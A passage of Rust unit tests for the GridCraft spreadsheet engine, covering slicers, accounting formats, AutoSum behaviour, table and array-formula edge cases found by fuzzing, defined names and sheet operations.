    s.execute("table.rename", json!({"table": &"ع".repeat(255), "name": name_200})).unwrap();
    assert!(s.doc().unwrap().wb.table(&"ع".repeat(200)).is_some());
}

#[test]
fn slicer_finds_a_named_table_on_another_sheet() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Region", "Qty"], ["East", 2], ["West", 5]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B3", "name": "Sales"})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Report"})).unwrap();
    let report = s.doc().unwrap().wb.sheet_index("Report").unwrap();
    assert_eq!(s.doc().unwrap().wb.active_sheet(), report);

    // With another sheet active, `table` still names the table, and the slicer goes on the table's sheet.
    let r = s.execute("insert.slicer", json!({"table": "Sales", "column": "Region", "at": "D2"})).unwrap();
    let id = r["slicer"].as_u64().unwrap();
    let home = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
    assert_eq!(s.doc().unwrap().wb.sheet(home).unwrap().slicers.len(), 1);
    assert!(s.doc().unwrap().wb.sheet(report).unwrap().slicers.is_empty());
    // It filters the table: "East" leaves the East row.
    s.execute("selection.set", json!({"range": "Sheet1!A1"})).unwrap();
    s.execute("slicer.toggle", json!({"slicer": id, "value": "East"})).unwrap();
    let sh = s.doc().unwrap().wb.sheet(home).unwrap();
    assert!(!sh.is_row_hidden(1) && sh.is_row_hidden(2));

    // `at` may name the table's sheet, and a table that isn't there is named in the error.
    s.execute("home.insertSheet", json!({"name": "Notes"})).unwrap();
    s.execute("table.insertSlicer", json!({"table": "sales", "column": "Qty", "at": "Sheet1!G2"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.sheet(home).unwrap().slicers.len(), 2);
    let e = s.execute("insert.slicer", json!({"table": "Missing", "column": "Region"})).unwrap_err();
    assert!(e.to_string().contains("Missing"), "{e}");
}

#[test]
fn slicer_filters_table() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Region", "Qty"], ["East", 2], ["West", 5], ["East", 3], ["North", 1]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B5", "name": "Sales"})).unwrap();
    s.execute("selection.set", json!({"cell": "A2"})).unwrap();

    // A new slicer on the Region column filters nothing (all values selected).
    let r = s.execute("insert.slicer", json!({})).unwrap();
    let id = r["slicer"].as_u64().unwrap() as u32;
    let hidden = |s: &Session| {
        let d = s.doc().unwrap();
        let sh = d.wb.active().unwrap();
        (1..=4).filter(|row| sh.is_row_hidden(*row)).count() // data rows are sheet rows 1..=4 (0-based header at 0)
    };
    assert_eq!(hidden(&s), 0);
    {
        let d = s.doc().unwrap();
        let sh = d.wb.active().unwrap();
        assert_eq!(sh.slicers.len(), 1);
        assert_eq!(sh.slicers[0].column, "Region");
    }

    // Single-click "East": only the two East rows remain (West row 2 and North row 4 hidden).
    s.execute("slicer.toggle", json!({"slicer": id, "value": "East"})).unwrap();
    assert_eq!(hidden(&s), 2);
    {
        let d = s.doc().unwrap();
        let sh = d.wb.active().unwrap();
        assert!(sh.is_row_hidden(2) && sh.is_row_hidden(4));
        assert!(!sh.is_row_hidden(1) && !sh.is_row_hidden(3));
    }

    // Ctrl-click "West" adds it: East + West visible, only North hidden.
    s.execute("slicer.toggle", json!({"slicer": id, "value": "West", "multi": true})).unwrap();
    assert_eq!(hidden(&s), 1);

    // Clear restores everything.
    s.execute("slicer.clear", json!({"slicer": id})).unwrap();
    assert_eq!(hidden(&s), 0);
    assert!(s.doc().unwrap().wb.active().unwrap().slicers[0].selected.is_none());

    // Deleting the slicer drops it and clears its filter.
    s.execute("slicer.toggle", json!({"slicer": id, "value": "East"})).unwrap();
    assert_eq!(hidden(&s), 2);
    s.execute("slicer.delete", json!({"slicer": id})).unwrap();
    assert_eq!(hidden(&s), 0);
    assert!(s.doc().unwrap().wb.active().unwrap().slicers.is_empty());

    // A bad value is rejected, not panicked.
    assert!(s.execute("slicer.toggle", json!({"value": "Nowhere"})).is_err());
}

#[test]
fn accounting_format_takes_the_symbol_it_is_given() {
    // The command documents `symbol`; it used to be dropped, so only `$` was ever reachable
    // from the control channel (asking for lempiras, #1893, changed nothing).
    let text = |s: &Session, a: &str| {
        let d = s.doc().unwrap();
        crate::display::cell_text(&d.wb, d.wb.active().unwrap(), CellRef::parse(a).unwrap())
    };
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1234.5"})).unwrap();
    s.execute("home.accounting", json!({"range": "A1", "symbol": "L"})).unwrap();
    assert_eq!(text(&s, "A1"), " L 1,234.50 ");
    // Without a symbol it stays the default `$` format, character for character.
    s.execute("home.accounting", json!({"range": "A1"})).unwrap();
    assert_eq!(text(&s, "A1"), " $ 1,234.50 ");
    // A quote or a backslash would end the format's quoted text, and a control character would
    // reach it as-is, so those symbols are refused.
    for bad in ["\"", "\\", "\n", "L\t"] {
        assert!(s.execute("home.accounting", json!({"range": "A1", "symbol": bad})).is_err(), "{bad:?}");
    }
}

#[test]
fn table_header_formatted_as_accounting_keeps_its_text_as_the_column_name() {
    // Found by the command-sequence fuzzer: the accounting format pads text (` 172.4 `), and that
    // padded text became the column name, which the XLSX writer then put in the header cell.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[172.4, "Qty"], [1, 2]]})).unwrap();
    s.execute("home.accounting", json!({"range": "A1:B2"})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B2", "header": true})).unwrap();
    let d = s.doc().unwrap();
    let t = &d.wb.sheet(0).unwrap().tables[0];
    let names: Vec<_> = t.columns.iter().map(|c| c.name.as_str()).collect();
    assert_eq!(names, ["172.4", "Qty"]);
    assert_eq!(v(&s, "A1"), Value::text("172.4"));
    reopen(&mut s);
    assert_eq!(v(&s, "A1"), Value::text("172.4"));
}

#[test]
fn a_formula_moved_into_a_table_header_becomes_its_text() {
    // Found by the command-sequence fuzzer: deleting a header row moved a formula into the
    // header, which kept it while the XLSX writer wrote the column name there instead.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Item", "Qty"], ["x", "=1+1"], ["y", 5]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B3", "header": true})).unwrap();
    s.execute("home.deleteRows", json!({"rows": "1:1"})).unwrap();
    let d = s.doc().unwrap();
    let sh = d.wb.sheet(0).unwrap();
    assert_eq!(sh.cell(CellRef::new(0, 1)).and_then(|x| x.formula.clone()), None);
    assert_eq!(v(&s, "B1"), Value::text("2"));
    let names: Vec<_> = sh.tables[0].columns.iter().map(|c| c.name.as_str()).collect();
    assert_eq!(names, ["x", "2"]);
}

#[test]
fn a_whole_column_table_without_headers_stays_on_the_sheet() {
    // Found by the command-sequence fuzzer: the inserted header row pushed the table's end past
    // the last row, so the table had an invalid range and was dropped from the XLSX file.
    let mut s = s();
    s.execute("insert.table", json!({"range": "A:C", "header": false})).unwrap();
    let d = s.doc().unwrap();
    assert_eq!(d.wb.sheet(0).unwrap().tables[0].range.a1(), "A:C");
    s.execute("cell.set", json!({"cell": "E1", "input": "=ROWS(Table1)"})).unwrap();
    assert_eq!(v(&s, "E1"), Value::Number(1_048_575.0));
    reopen(&mut s);
    assert_eq!(v(&s, "E1"), Value::Number(1_048_575.0));
    s.execute("cell.set", json!({"cell": "F1048576", "input": "x"})).unwrap();
    let e = s.execute("insert.table", json!({"range": "F:F", "header": false})).unwrap_err();
    assert!(e.to_string().contains("pushed off the end"), "{e}");
}

#[test]
fn inserting_a_column_next_to_far_right_data_names_gridcraft_in_the_refusal() {
    let mut sess = s();
    sess.execute("cell.set", json!({"cell": "XFD1", "input": "2"})).unwrap();
    let e = sess.execute("home.insertColumns", json!({"cols": "A:A"})).unwrap_err();
    assert!(e.to_string().contains("GridCraft cannot shift nonblank cells"), "{e}");
    assert!(!e.to_string().contains("Excel"), "{e}");
}

#[test]
fn inserting_cells_refuses_to_push_values_off_the_sheet() {
    for (shift, edge, last_fit, last_ok) in [("right", "XFD1", "XFC1", "XFD1"), ("down", "A1048576", "A1048575", "A1048576")] {
        let mut sess = s();
        sess.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
        sess.execute("cell.set", json!({"cell": edge, "input": "2"})).unwrap();
        let e = sess.execute("home.insertCells", json!({"range": "A1", "shift": shift})).unwrap_err();
        assert!(e.to_string().contains("loss of data"), "{e}");
        assert!(e.to_string().contains("GridCraft") && !e.to_string().contains("Excel"), "{e}");
        assert_eq!(v(&sess, "A1"), Value::Number(1.0));
        assert_eq!(v(&sess, edge), Value::Number(2.0));
        // A value that still fits moves to the last valid cell.
        let mut sess = s();
        sess.execute("cell.set", json!({"cell": last_fit, "input": "2"})).unwrap();
        sess.execute("home.insertCells", json!({"range": "A1", "shift": shift})).unwrap();
        assert_eq!(v(&sess, last_ok), Value::Number(2.0));
    }
}

#[test]
fn autosum_over_whole_rows_is_one_undo_step_within_the_data() {
    // Found by the command-sequence fuzzer: AutoSum over rows `3:5` ran one `cell.set` per column
    // (16,384 undo steps, so undo never got back to the start).
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A3", "values": [[1, 2], [3, 4], [5, 6]]})).unwrap();
    s.execute("formulas.autoSum", json!({"range": "3:5"})).unwrap();
    assert_eq!(v(&s, "A6"), Value::Number(9.0));
    assert_eq!(v(&s, "B6"), Value::Number(12.0));
    let d = s.doc().unwrap();
    assert_eq!(d.undo.len(), 2);
    assert_eq!(d.wb.active().unwrap().cells.used_range().unwrap().a1(), "A3:B6");
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(v(&s, "A6"), Value::Empty);
    assert_eq!(v(&s, "B6"), Value::Empty);
}

fn formula_at(s: &Session, a: &str) -> Option<String> {
    s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse(a).unwrap()).and_then(|c| c.formula.as_ref().map(|f| f.text.clone()))
}

#[test]
fn autosum_of_a_single_cell_stops_at_a_blank_cell() {
    // #3291: a blank row between two blocks of numbers ended the guess one block too late, so the
    // second total summed the first block (and its total) as well.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "B4", "values": [[1], [2], [3]]})).unwrap();
    s.execute("cell.set", json!({"cell": "B7", "input": "=SUM(B4:B6)"})).unwrap();
    s.execute("range.setValues", json!({"range": "B9", "values": [[10], [20]]})).unwrap();
    s.execute("selection.set", json!({"cell": "B11"})).unwrap();
    s.execute("formulas.autoSum", json!({})).unwrap();
    assert_eq!(v(&s, "B11"), Value::Number(30.0));
}

#[test]
fn autosum_over_a_row_totals_it_to_the_right() {
    // As in Excel: a row selected and AutoSum puts one total to its right, not a one-cell total
    // under each of its cells.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "B2", "values": [[1, 2, 3, 4]]})).unwrap();
    s.execute("formulas.autoSum", json!({"range": "B2:E2"})).unwrap();
    assert_eq!(formula_at(&s, "F2").as_deref(), Some("SUM(B2:E2)"));
    assert_eq!(v(&s, "F2"), Value::Number(10.0));
    assert!(gridcraft_core::RangeRef::parse("B3:F3").unwrap().iter().all(|c| v(&s, &c.a1()) == Value::Empty), "nothing under the row");
    assert_eq!(s.doc().unwrap().undo.len(), 2, "one undo step");
    // A row whose last cell is empty takes its total there.
    s.execute("range.setValues", json!({"range": "B4", "values": [[5, 6, 7]]})).unwrap();
    s.execute("formulas.autoSum", json!({"range": "B4:E4"})).unwrap();
    assert_eq!(formula_at(&s, "E4").as_deref(), Some("SUM(B4:D4)"));
    assert_eq!(v(&s, "F4"), Value::Empty);
    // AVERAGE and the rest go the same way.
    s.execute("formulas.autoSum", json!({"range": "B2:E2", "function": "average"})).unwrap();
    assert_eq!(formula_at(&s, "F2").as_deref(), Some("AVERAGE(B2:E2)"));
}

#[test]
fn autosum_over_a_whole_row_totals_it_after_the_data() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A2", "values": [[1, 2, 3]]})).unwrap();
    s.execute("formulas.autoSum", json!({"range": "2:2"})).unwrap();
    assert_eq!(formula_at(&s, "D2").as_deref(), Some("SUM(A2:C2)"));
    assert_eq!(s.doc().unwrap().wb.active().unwrap().cells.used_range().unwrap().a1(), "A2:D2", "not out to the last column");
}

#[test]
fn autosum_fills_a_selections_empty_last_column_and_row() {
    // As in Excel: an empty last column takes each row's total, an empty last row each column's,
    // and with both the corner takes the total of the block.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2], [3, 4]]})).unwrap();
    s.execute("formulas.autoSum", json!({"range": "A1:C2"})).unwrap();
    assert_eq!((formula_at(&s, "C1").as_deref(), formula_at(&s, "C2").as_deref()), (Some("SUM(A1:B1)"), Some("SUM(A2:B2)")));
    assert_eq!((v(&s, "C1"), v(&s, "C2")), (Value::Number(3.0), Value::Number(7.0)));
    assert!(gridcraft_core::RangeRef::parse("A3:C3").unwrap().iter().all(|c| v(&s, &c.a1()) == Value::Empty), "no totals under the rows");

    s.execute("range.setValues", json!({"range": "E1", "values": [[1, 2], [3, 4]]})).unwrap();
    let steps = s.doc().unwrap().undo.len();
    s.execute("formulas.autoSum", json!({"range": "E1:G3"})).unwrap();
    for (cell, formula, value) in
        [("E3", "SUM(E1:E2)", 4.0), ("F3", "SUM(F1:F2)", 6.0), ("G1", "SUM(E1:F1)", 3.0), ("G2", "SUM(E2:F2)", 7.0), ("G3", "SUM(E1:F2)", 10.0)]
    {
        assert_eq!(formula_at(&s, cell).as_deref(), Some(formula), "{cell}");
        assert_eq!(v(&s, cell), Value::Number(value), "{cell}");
    }
    assert_eq!(s.doc().unwrap().undo.len(), steps + 1, "one undo step");

    // Neither empty: totals below each column, as before.
    s.execute("range.setValues", json!({"range": "I1", "values": [[1, 2], [3, 4]]})).unwrap();
    s.execute("formulas.autoSum", json!({"range": "I1:J2"})).unwrap();
    assert_eq!((formula_at(&s, "I3").as_deref(), formula_at(&s, "J3").as_deref()), (Some("SUM(I1:I2)"), Some("SUM(J1:J2)")));
    assert_eq!(v(&s, "K1"), Value::Empty);
}

#[test]
fn insert_and_delete_cells_never_shift_part_of_a_table() {
    // Found by the command-sequence fuzzer: Delete Cells moved part of a table's cells (so two
    // tables overlapped) or narrowed a table without dropping its columns, and a table without
    // headers pushed the cells of another table down from under it.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "D8", "values": [["a", "b", "c"], [1, 2, 3], [4, 5, 6]]})).unwrap();
    s.execute("insert.table", json!({"range": "D8:F10", "header": true})).unwrap();
    for (cmd, range, shift) in [
        ("home.deleteCells", "E9:G9", "left"),
        ("home.deleteCells", "E9", "up"),
        ("home.insertCells", "C9:D9", "down"),
        ("home.deleteCells", "D8:F8", "up"),
        ("home.insertCells", "A9:B9", "right"),
    ] {
        let e = s.execute(cmd, json!({"range": range, "shift": shift})).unwrap_err();
        assert!(e.to_string().contains("shift cells in a table"), "{cmd} {range} {shift}: {e}");
    }
    // Whole table columns: the table loses (or gains) columns with them.
    s.execute("home.deleteCells", json!({"range": "E7:E12", "shift": "left"})).unwrap();
    let names = |s: &Session| -> Vec<String> { s.doc().unwrap().wb.sheet(0).unwrap().tables[0].columns.iter().map(|c| c.name.clone()).collect() };
    assert_eq!(names(&s), ["a", "c"]);
    assert_eq!(s.doc().unwrap().wb.sheet(0).unwrap().tables[0].range.a1(), "D8:E10");
    s.execute("home.insertCells", json!({"range": "E8:E10", "shift": "right"})).unwrap();
    assert_eq!(names(&s), ["a", "Column2", "c"]);
    assert_eq!(v(&s, "E8"), Value::text("Column2"));
    let e = s.execute("insert.table", json!({"range": "H1:H2", "name": "T1"})).unwrap_err();
    assert!(e.to_string().contains("not valid"), "a cell reference isn't a table name: {e}");
    let e = s.execute("insert.table", json!({"range": "D5:F6", "header": false})).unwrap_err();
    assert!(e.to_string().contains("shift cells in a table"), "{e}");
}

#[test]
fn table_names_with_a_hyphen_are_rejected() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Qty"], [7]]})).unwrap();
    let e = s.execute("insert.table", json!({"range": "A1:A2", "header": true, "name": "A-B"})).unwrap_err();
    assert!(e.to_string().contains("not valid"), "{e}");
    assert!(s.doc().unwrap().wb.table("A-B").is_none());
    s.execute("insert.table", json!({"range": "A1:A2", "header": true, "name": "Sales"})).unwrap();
    let e = s.execute("table.rename", json!({"table": "Sales", "name": "A-B"})).unwrap_err();
    assert!(e.to_string().contains("not valid"), "{e}");
    assert!(s.doc().unwrap().wb.table("Sales").is_some());
    assert!(s.execute("table.rename", json!({"table": "Sales", "name": ".AB"})).is_err());
    s.execute("table.rename", json!({"table": "Sales", "name": "A_B"})).unwrap();
    assert!(s.doc().unwrap().wb.table("A_B").is_some());
}

#[test]
fn undo_and_redo_keep_the_watch_window_list() {
    // Found by the command-sequence fuzzer: the list lives in the workbook but isn't an edit, so
    // undoing an earlier edit swapped in a snapshot without it.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    s.execute("formulas.watchWindow", json!({"add": "Sheet1!A1"})).unwrap();
    let watched = |s: &mut Session| -> Vec<String> {
        let rows = s.execute("formulas.watchWindow", json!({})).unwrap();
        rows.as_array().unwrap().iter().map(|r| r["cell"].as_str().unwrap().to_string()).collect()
    };
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(watched(&mut s), ["Sheet1!A1"], "kept after undo");
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(watched(&mut s), ["Sheet1!A1"], "kept after redo");
}

#[test]
fn merging_over_a_spill_blocks_it_and_unmerging_unblocks_it() {
    // Found by the command-sequence fuzzer: merges changed no cell the spill depended on, so the
    // spill went on as if the merged cells were free (a full recalc gave #SPILL!).
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)"})).unwrap();
    s.execute("home.mergeCenter", json!({"range": "A2:B3"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Error(gridcraft_core::CellError::Spill));
    s.execute("home.mergeCenter", json!({"range": "A2:B3"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
    assert_eq!(v(&s, "A3"), Value::Number(3.0));
}

#[test]
fn inserting_a_link_without_text_preserves_a_spill_child() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)"})).unwrap();
    assert_eq!(v(&s, "A2"), Value::Number(2.0));
    s.execute("insert.link", json!({"cell": "A2", "target": "https://example.org"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(1.0));
    assert_eq!(v(&s, "A2"), Value::Number(2.0));
    let d = s.doc().unwrap();
    let at = CellRef::parse("A2").unwrap();
    assert_eq!(d.wb.active().unwrap().hyperlinks.get(&at).map(|link| link.target.as_str()), Some("https://example.org"));
}

#[test]
fn inserting_a_link_without_text_preserves_an_empty_spill_child() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1:C3", "values": [["a", "x", 1], ["b", "x", 2], ["a", "y", 3]]})).unwrap();
    s.execute("cell.set", json!({"cell": "K1", "input": "=PIVOTBY(A1:A3,B1:B3,C1:C3,LAMBDA(x,SUM(x)))"})).unwrap();
    assert_eq!(v(&s, "K1"), Value::Empty);
    let at = CellRef::parse("M3").unwrap();
    assert_eq!(v(&s, "M3"), Value::Empty);
    assert_eq!(s.doc().unwrap().wb.active().unwrap().spill_anchor(at), Some(CellRef::parse("K1").unwrap()));
    s.execute("insert.link", json!({"cell": "M3", "target": "https://example.org"})).unwrap();
    assert_eq!(v(&s, "K1"), Value::Empty);
    assert_eq!(v(&s, "M3"), Value::Empty);
    let d = s.doc().unwrap();
    assert_eq!(d.wb.active().unwrap().hyperlinks.get(&at).map(|link| link.target.as_str()), Some("https://example.org"));
}

#[test]
fn multi_cell_array_formulas_and_tables_dont_overlap() {
    // Found by the command-sequence fuzzer: an array over a table header lost its value to the
    // header name written as text, then showed #SPILL! (and reloaded from XLSX differently).
    let mut s = s();
    s.execute("range.setValues", json!({"range": "B2", "values": [["Item", "Qty"], ["x", 2]]})).unwrap();
    s.execute("insert.table", json!({"range": "B2:C3", "header": true})).unwrap();
    s.execute("selection.set", json!({"range": "B1:B2"})).unwrap();
    let e = s.execute("cell.set", json!({"input": "=1", "array": true})).unwrap_err();
    assert!(e.to_string().contains("aren't allowed in tables"), "{e}");
    assert_eq!(v(&s, "B2"), Value::text("Item"));
    s.execute("selection.set", json!({"range": "E1:E2"})).unwrap();
    s.execute("cell.set", json!({"input": "=1", "array": true})).unwrap();
    let e = s.execute("insert.table", json!({"range": "E2:F3"})).unwrap_err();
    assert!(e.to_string().contains("aren't allowed in tables"), "{e}");
    // One-cell arrays are fine.
    s.execute("selection.set", json!({"range": "C3"})).unwrap();
    s.execute("cell.set", json!({"input": "=5", "array": true})).unwrap();
    assert_eq!(v(&s, "C3"), Value::Number(5.0));
}

#[test]
fn copies_of_a_long_named_sheet_get_unique_names() {
    // Found by the command-sequence fuzzer: `name (2)` was cut to 31 characters, so the second
    // copy of a 30-character name took the first copy's name.
    let mut s = s();
    s.execute("sheet.rename", json!({"sheet": 0, "name": "Long name of a sheet 31 chars!"})).unwrap();
    s.execute("sheet.move", json!({"sheet": 0, "to": 1, "copy": true})).unwrap();
    s.execute("sheet.move", json!({"sheet": 0, "to": 2, "copy": true})).unwrap();
    let d = s.doc().unwrap();
    let names: Vec<&str> = d.wb.sheets.iter().map(|x| x.name.as_str()).collect();
    assert_eq!(names, ["Long name of a sheet 31 chars!", "Long name of a sheet 31 cha (2)", "Long name of a sheet 31 cha (3)"]);
}

#[test]
fn row_and_column_inserts_move_legacy_array_ranges() {
    // Found by the command-sequence fuzzer: the formula cell moved but its array range stayed,
    // so the array covered the wrong cells (and read back from XLSX as #SPILL!).
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "7"})).unwrap();
    s.execute("selection.set", json!({"range": "C3:D3"})).unwrap();
    s.execute("cell.set", json!({"input": "=$A$1*2", "array": true})).unwrap();
    s.execute("home.insertColumns", json!({"cols": "B:B"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "1:1"})).unwrap();
    let d = s.doc().unwrap();
    let f = d.wb.sheet(0).unwrap().cell(CellRef::new(3, 3)).and_then(|x| x.formula.clone()).unwrap();
    assert_eq!(f.array, Some(gridcraft_core::RangeRef::parse("D4:E4").unwrap()));
    assert_eq!(v(&s, "E4"), Value::Number(14.0));
    reopen(&mut s);
    assert_eq!(v(&s, "E4"), Value::Number(14.0));
}

#[test]
fn part_of_a_legacy_array_cant_be_changed() {
    // Found by the command-sequence fuzzer: a value typed into an array cell showed in the
    // workbook, but the file kept the array there (Excel refuses the edit).
    let mut s = s();
    s.execute("selection.set", json!({"range": "A1:A3"})).unwrap();
    s.execute("cell.set", json!({"input": "=5", "array": true})).unwrap();
    let e = s.execute("range.setValues", json!({"range": "A2", "values": [[13]]})).unwrap_err();
    assert!(e.to_string().contains("part of an array"), "{e}");
    assert_eq!(v(&s, "A2"), Value::Number(5.0));
    // Replacing the whole array is fine.
    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [3]]})).unwrap();
    assert_eq!(v(&s, "A2"), Value::Number(2.0));
}

#[test]
fn create_names_from_selection() {
    let names = |s: &Session| -> Vec<(String, String)> {
        let mut v: Vec<_> = s.doc().unwrap().wb.names.iter().map(|n| (n.name.clone(), n.formula.clone())).collect();
        v.sort();
        v
    };
    let named = |n: &str, f: &str| (n.to_string(), f.to_string());
    let mut s = s();
    s.execute(
        "range.setValues",
        json!({"range": "A1", "values": [["", "Jan", "Feb", ""], ["North", 1, 2, "N"], ["South", 3, 4, "S"], ["", "First", "Second", ""]]}),
    )
    .unwrap();
    s.execute("formulas.createFromSelection", json!({"range": "A1:D4", "top": false, "bottom": true, "right": true})).unwrap();
    assert_eq!(
        names(&s),
        [named("First", "Sheet1!$B$1:$B$3"), named("N", "Sheet1!$A$2:$C$2"), named("S", "Sheet1!$A$3:$C$3"), named("Second", "Sheet1!$C$1:$C$3")]
    );
    // Existing names are kept unless replacing is asked for.
    let r = s.execute("formulas.createFromSelection", json!({"range": "A1:C3", "top": true, "left": true})).unwrap();
    assert_eq!(r["created"], 4);
    let r = s.execute("formulas.createFromSelection", json!({"range": "B1:C3", "top": true})).unwrap();
    assert_eq!((r["created"].clone(), r["skipped"].clone()), (json!(0), json!(["Jan", "Feb"])));
    s.execute("cell.set", json!({"cell": "B1", "input": "N"})).unwrap();
    let r = s.execute("formulas.createFromSelection", json!({"range": "B1:B3", "replace": true})).unwrap();
    assert_eq!(r["created"], 1);
    assert!(names(&s).contains(&named("N", "Sheet1!$B$2:$B$3")));
    assert!(names(&s).contains(&named("North", "Sheet1!$B$2:$C$2")));
}

#[test]
fn names_that_look_like_references_are_refused() {
    let mut s = s();
    for bad in ["R1C1", "r2", "C3", "RC", "R", "c", "rc12", "A1", "XFD1048576", "1st"] {
        assert!(s.execute("formulas.defineName", json!({"name": bad, "refersTo": "=1"})).is_err(), "{bad}");
    }
    for good in ["R1C1X", "Rate", "RCx", "Rx", "_R1", "Cost"] {
        s.execute("formulas.defineName", json!({"name": good, "refersTo": "=1"})).unwrap();
    }
}

#[test]
fn lambda_names_keep_their_case_in_calls() {
    let mut s = s();
    s.execute("formulas.defineName", json!({"name": "Double", "refersTo": "=LAMBDA(x,x*2)"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Quad", "refersTo": "=LAMBDA(x,Double(Double(x)))"})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "=double(4)+Quad(1)+sum(1)"})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "A1"})).unwrap()["formula"], "=Double(4)+Quad(1)+SUM(1)");
    assert_eq!(v(&s, "A1"), Value::Number(13.0));
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let b64 = r["base64"].as_str().unwrap().to_string();
    s.execute("file.open", json!({"name": "x.xlsx", "base64": b64})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "A1"})).unwrap()["formula"], "=Double(4)+Quad(1)+SUM(1)");
    let quad = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Quad").unwrap().formula.clone();
    assert_eq!(quad, "LAMBDA(x,Double(Double(x)))");
    assert_eq!(v(&s, "A1"), Value::Number(13.0));
}

#[test]
fn sheets() {
    let mut s = s();
    s.execute("home.insertSheet", json!({})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "5"})).unwrap();
    s.execute("sheet.rename", json!({"name": "Data"})).unwrap();
    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "=Data!A1*2"})).unwrap();
    assert_eq!(v(&s, "A1"), Value::Number(10.0));
    s.execute("sheet.rename", json!({"sheet": "Data", "name": "My Data"})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "A1"})).unwrap()["formula"], "='My Data'!A1*2");
}

#[test]
fn sheet_operations_keep_names_on_their_sheets() {
    let names = |s: &Session| -> Vec<(String, Option<String>, String)> {
        let wb = &s.doc().unwrap().wb;
        let mut v: Vec<_> =
            wb.names.iter().map(|n| (n.name.clone(), n.scope.and_then(|i| wb.sheet(i)).map(|s| s.name.clone()), n.formula.clone())).collect();
        v.sort();
        v
    };
    let named = |n: &str, scope: Option<&str>, f: &str| (n.to_string(), scope.map(str::to_string), f.to_string());
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Data"})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Notes"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=Data!$A$1", "scope": "Data"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=Notes!$B$1", "scope": "Notes"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Total", "refersTo": "=Data!$C$1"})).unwrap();
    // Moving Data (index 1) to the end: its names go with it.
    s.execute("sheet.move", json!({"sheet": "Data", "to": 2})).unwrap();
    assert_eq!(names(&s), [named("Rate", Some("Data"), "Data!$A$1"), named("Rate", Some("Notes"), "Notes!$B$1"), named("Total", None, "Data!$C$1")]);
    // Copying Data to the front copies its sheet-level names, referring to the copy.
    s.execute("sheet.move", json!({"sheet": "Data", "to": 0, "copy": true})).unwrap();
    assert_eq!(s.doc().unwrap().wb.sheets[0].name, "Data (2)");
    assert_eq!(
        names(&s),
        [
            named("Rate", Some("Data"), "Data!$A$1"),
            named("Rate", Some("Data (2)"), "'Data (2)'!$A$1"),
            named("Rate", Some("Notes"), "Notes!$B$1"),
            named("Total", None, "Data!$C$1")
        ]
    );
    // Deleting Data removes its names; names referring to it become #REF!.
    s.execute("home.deleteSheet", json!({"sheet": "Data"})).unwrap();
    assert_eq!(
        names(&s),
        [named("Rate", Some("Data (2)"), "'Data (2)'!$A$1"), named("Rate", Some("Notes"), "Notes!$B$1"), named("Total", None, "#REF!")]
    );
    // Deleting a name in one scope keeps the others.
    s.execute("formulas.deleteName", json!({"name": "rate", "scope": "Notes"})).unwrap();
    assert_eq!(names(&s), [named("Rate", Some("Data (2)"), "'Data (2)'!$A$1"), named("Total", None, "#REF!")]);
    assert!(s.execute("formulas.deleteName", json!({"name": "Total", "scope": "Notes"})).is_err());
    s.execute("formulas.deleteName", json!({"name": "Total", "scope": "Workbook"})).unwrap();
    assert_eq!(names(&s).len(), 1);
}

#[test]
fn deleting_a_3d_span_end_sheet_keeps_the_rest() {
    let book = || {
        let mut s = s();
        for name in ["Sheet2", "Sheet3", "Results"] {
            s.execute("home.insertSheet", json!({"name": name})).unwrap();
        }
        for (sheet, n) in [("Sheet1", 3), ("Sheet2", 5), ("Sheet3", 7)] {
            s.execute("sheet.activate", json!({"sheet": sheet})).unwrap();
            s.execute("cell.set", json!({"cell": "A1", "input": n.to_string()})).unwrap();
        }
        s.execute("sheet.activate", json!({"sheet": "Results"})).unwrap();
